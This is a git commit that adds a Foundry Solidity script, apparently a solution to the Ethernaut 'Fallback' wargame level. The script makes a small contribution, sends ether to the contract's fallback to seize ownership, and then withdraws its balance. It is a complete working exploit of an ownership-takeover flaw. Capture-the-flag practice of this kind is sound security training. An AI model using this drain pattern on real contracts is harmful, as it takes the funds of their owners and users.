2ea6547c98281869d7f8898f0612a84e7ef6472c
Ashiq Ahamed <aashiq121205@gmail.com>
2025-02-23 05:11:17 +0530

    Fallback solution

---
+++ script/FallbackSolution.s.sol
@@ -0,0 +1,23 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "../src/Fallback.sol";
+import "forge-std/Script.sol";
+import "forge-std/console.sol";
+
+contract FallbackSolution is Script {
+    
+    Fallback public fallbackIns = Fallback(payable(0x4c949eF7B0BeBd67aDCaf8c0bB99af0908fCD0BC));
+
+    function run() external {
+        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
+
+        fallbackIns.contribute{value: 1 wei}();
+        address(fallbackIns).call{value: 1 wei}("");
+        console.log("New Owner: ", fallbackIns.owner());
+        console.log("My address: ", vm.envAddress("MY_ADDRESS"));
+        fallbackIns.withdraw();
+
+        vm.stopBroadcast();
+    }
+}
